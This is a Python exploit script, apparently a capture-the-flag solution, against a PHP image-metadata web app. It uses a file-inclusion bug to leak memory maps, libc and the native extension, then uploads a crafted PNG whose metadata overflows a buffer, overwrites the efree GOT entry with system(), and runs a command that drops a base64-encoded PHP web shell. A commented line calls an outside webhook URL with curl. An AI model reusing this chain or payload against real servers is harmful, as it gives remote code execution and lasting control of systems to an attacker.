import requests
import re
from pwn import *
from PIL import Image, PngImagePlugin
import os
from bs4 import BeautifulSoup
import base64

"""
b *_emalloc_56+53
c
c
c

...

c 11


Llegaremos aca:
 ► 0x7f504260f571 <zif_getImgMetadata+625>     call   strcpy@plt                  <strcpy@plt>
        dest: 0x7f50453cb490 (system) ◂— 0xfb86e90b74ff8548
        src: 0x564cd4cc0216 ◂— 'BBBBBBBB'   # Con el title
 

"""

#url = "http://192.168.86.46:1337"
#url = "http://127.0.0.1:1337"
#url = "http://ip172-18-0-17-cu3chji91nsg00b4mhog-1337.direct.labs.play-with-docker.com/"
url = "http://94.237.50.242:42897"
#url = "http://192.168.159.131:1337"

def lfi(file):
    response = requests.get(url + "/view.php?image=" + file)
    soup = BeautifulSoup(response.text, 'html.parser')
    img_tag = soup.find('img')
    src = img_tag.get('src')
    
    b64_content = src.split(',')[1]

    decoded_content = base64.b64decode(b64_content).decode('utf-8')

    return decoded_content

def download_libc():

    file = "/lib/x86_64-linux-gnu/libc.so.6"
    response = requests.get(url + "/view.php?image=" + file)
    soup = BeautifulSoup(response.text, 'html.parser')
    img_tag = soup.find('img')
    src = img_tag.get('src')
    
    b64_content = src.split(',')[1]

    # Decodificar el contenido Base64
    binary_content = base64.b64decode(b64_content)
    
    # Ruta donde guardar el archivo
    libc_path = "./libc.so.6"
    
    # Guardar el contenido en un archivo
    with open(libc_path, "wb") as libc_file:
        libc_file.write(binary_content)
    
    # Cambiar permisos para hacerlo ejecutable
    os.chmod(libc_path, 0o755)
    print(f"Archivo guardado como {libc_path} con permisos de ejecución.")


def download_binary():

    file = "/app/metadata_reader.so"
    response = requests.get(url + "/view.php?image=" + file)
    soup = BeautifulSoup(response.text, 'html.parser')
    img_tag = soup.find('img')
    src = img_tag.get('src')
    
    b64_content = src.split(',')[1]

    # Decodificar el contenido Base64
    binary_content = base64.b64decode(b64_content)
    
    # Ruta donde guardar el archivo
    libc_path = "./metadata_reader.so"
    
    # Guardar el contenido en un archivo
    with open(libc_path, "wb") as libc_file:
        libc_file.write(binary_content)
    
    # Cambiar permisos para hacerlo ejecutable
    os.chmod(libc_path, 0o755)
    print(f"Archivo guardado como {libc_path} con permisos de ejecución.")

os.system("rm ./libc.so.6 2>/dev/null")
os.system("rm ./metadata_reader.so 2>/dev/null")

download_libc()
download_binary()

elf = ELF("./metadata_reader.so")

libc = ELF("./libc.so.6")

memory_vmmap = lfi("/proc/self/maps")

print(memory_vmmap)

# Libc Leak
pattern = r".*/usr/lib/x86_64-linux-gnu/libc.so.6"

matches = re.findall(pattern, memory_vmmap)

libc_base_leak = int("0x" + matches[0].split("-")[0], 16)

# Elf Base Leak
pattern = r".*/app/metadata_reader.so"

matches = re.findall(pattern, memory_vmmap)

pie_base_leak = int("0x" + matches[0].split("-")[0], 16)

libc.address = libc_base_leak
elf.address = pie_base_leak

print(f"Libc base leak: {hex(libc_base_leak)}")
print(f"PIE base leak: {hex(pie_base_leak)}")
print(f"GOT efree: {hex(elf.got._efree)}")
print(f"System: {hex(libc.sym.system)}")

input("PAUSE")

pop_rdi = libc.address + 0x00000000000277e5 # pop rdi ; ret
pop_rbp = libc.address + 0x00000000000276ec # pop rbp ; ret
pop_rax = libc.address + 0x000000000003f197 # pop rax ; ret
ret = libc.address + 0x0000000000026e99 # ret

one_gadget = [0x4c139, 0x4c140, 0xd511f]

# La solucion con call rax (pendiente ojo)
payload = b"".join([
    b"B"*40,
    #p64(0x41414141414141)
    p64(elf.address + 0x1478)
    #p64(libc.address + one_gadget[2])
    #p64(ret),
    #p64(pop_rdi),
    #p64(0x4141414141),
    #b"E"*40
])

# Solucion con call rax (pendiente UwU con eso generas el overflow ojito ahi QwQ)
#artist = b"A"*56
#title = payload
#copyright = b"A"*19

#artist = b"A"*56 + p64(elf.got._efree)
#title = p64(libc.sym.system) + b"\x00"*10
#copyright = "C"*10

artist = b"A"*56 + p64(elf.got._efree)
#title = b"sh -c 'curl -k https://webhook.site/bd21ad76-6535-486b-a2e4-85722abbdea6'"
title = b"bash -c \"echo 'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+' | base64 -d -w 0 > shell_1.php\""
copyright = p64(libc.sym.system)

# Ruta del archivo PNG
input_file = "starry_night.png"
output_file = "starry_night_mod.png"

os.system("rm " + output_file + " 2>/dev/null")

# Cargar la imagen
image = Image.open(input_file)

# Crear metadatos personalizados
metadata = PngImagePlugin.PngInfo()
# Artist => Title => Copyright

metadata.add_text("Artist", artist)
metadata.add_text("Title", title)
metadata.add_text("Copyright", copyright)

# Guardar la imagen con los nuevos metadatos
image.save(output_file, "PNG", pnginfo=metadata)

print(f"Metadatos actualizados y guardados en {output_file}")

input("PAUSE")

# Ruta de la imagen que quieres subir
file_path = 'starry_night_mod.png'

# Abrir el archivo de imagen en modo binario
with open(file_path, 'rb') as file:
    # Los datos de la solicitud POST
    files = {
        'file': ('pwner.png', file, 'image/png')
    }
    
    # Realizar la solicitud POST
    response = requests.post(url + "/upload.php", files=files)
    
    # Imprimir la respuesta del servidor
    print(response.status_code)
    print(response.text)
